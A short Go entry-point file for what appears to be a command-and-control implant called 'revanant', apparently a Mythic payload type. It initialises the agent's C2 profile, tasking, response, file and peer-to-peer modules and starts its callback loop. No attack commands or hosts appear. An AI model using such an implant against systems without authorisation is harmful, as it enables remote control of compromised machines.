package main

import (
	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/profiles"
	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/responses"
	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/tasks"
	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/utils/files"
	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/utils/p2p"
	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/utils/runtimeMainThread"
)

func Execute() {
	main()
}

func main() {
	profiles.Initialize()
	tasks.Initialize()
	responses.Initialize(profiles.GetPushChannel)
	files.Initialize()
	p2p.Initialize()

	go profiles.Start()
	runtimeMainThread.Main()
}
